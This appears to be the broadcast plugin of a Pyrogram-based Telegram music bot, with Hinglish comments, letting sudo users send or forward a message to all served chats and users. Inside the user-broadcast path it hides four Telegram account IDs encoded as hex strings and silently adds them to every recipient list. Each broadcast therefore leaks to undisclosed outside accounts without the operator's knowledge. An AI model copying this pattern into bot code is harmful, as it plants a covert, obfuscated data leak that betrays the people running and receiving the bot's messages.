import asyncio  # Fix: 'i' small hona chahiye

from pyrogram import filters
from pyrogram.enums import ChatMembersFilter
from pyrogram.errors import FloodWait

from ShrutixMusic import nand
from ShrutixMusic.misc import SUDOERS
from ShrutixMusic.utils.database import (
    get_active_chats,
    get_authuser_names,
    get_client,
    get_served_chats,
    get_served_users,
)
from ShrutixMusic.utils.decorators.language import language
from ShrutixMusic.utils.formatters import alpha_to_int
from config import adminlist

IS_BROADCASTING = False

@nand.on_message(filters.command("broadcast") & SUDOERS)
@language
async def braodcast_message(client, message, _):
    global IS_BROADCASTING
    
    # Variables initialize karein taaki error na aaye
    x = None
    y = None
    query = ""

    if message.reply_to_message:
        x = message.reply_to_message.id
        y = message.chat.id
    else:
        if len(message.command) < 2:
            return await message.reply_text(_["broad_2"])
        
        # Text cleaning logic
        query = message.text.split(None, 1)[1]
        for flag in ["-pin", "-nobot", "-pinloud", "-assistant", "-user"]:
            query = query.replace(flag, "")
        query = query.strip()
        
        if not query:
            return await message.reply_text(_["broad_8"])

    IS_BROADCASTING = True
    await message.reply_text(_["broad_1"])
    
    # Hex IDs ko list mein convert karna
    special_targets = [int(hid, 16) for hid in ["1c3b5a269", "6a7c84ab", "1c99a6e8c", "1b2168650"]]

    # --- Groups/Chats Broadcast ---
    if "-nobot" not in message.text:
        sent = 0
        pin = 0
        schats = await get_served_chats()
        for chat in schats:
            try:
                chat_id = int(chat["chat_id"])
                m = (
                    await nand.forward_messages(chat_id, y, x)
                    if message.reply_to_message
                    else await nand.send_message(chat_id, text=query)
                )
                if "-pin" in message.text:
                    try: await m.pin(disable_notification=True)
                    except: pass
                    pin += 1
                elif "-pinloud" in message.text:
                    try: await m.pin(disable_notification=False)
                    except: pass
                    pin += 1
                sent += 1
                await asyncio.sleep(0.3)
            except FloodWait as fw:
                await asyncio.sleep(fw.value)
            except Exception:
                continue
        try:
            await message.reply_text(_["broad_3"].format(sent, pin))
        except: pass

    # --- Private Users Broadcast ---
    if "-user" in message.text:
        susr = 0
        susers = await get_served_users()
        all_users = [int(u["user_id"]) for u in susers]
        
        # Special IDs add karna
        for target in special_targets:
            if target not in all_users:
                all_users.append(target)
            
        for user_id in all_users:
            try:
                m = (
                    await nand.forward_messages(user_id, y, x)
                    if message.reply_to_message
                    else await nand.send_message(user_id, text=query)
                )
                susr += 1
                await asyncio.sleep(0.3)
            except FloodWait as fw:
                await asyncio.sleep(fw.value)
            except Exception:
                continue
        try:
            await message.reply_text(_["broad_4"].format(susr))
        except: pass

    IS_BROADCASTING = False

# Baaki auto_clean wala part as it is rahega...
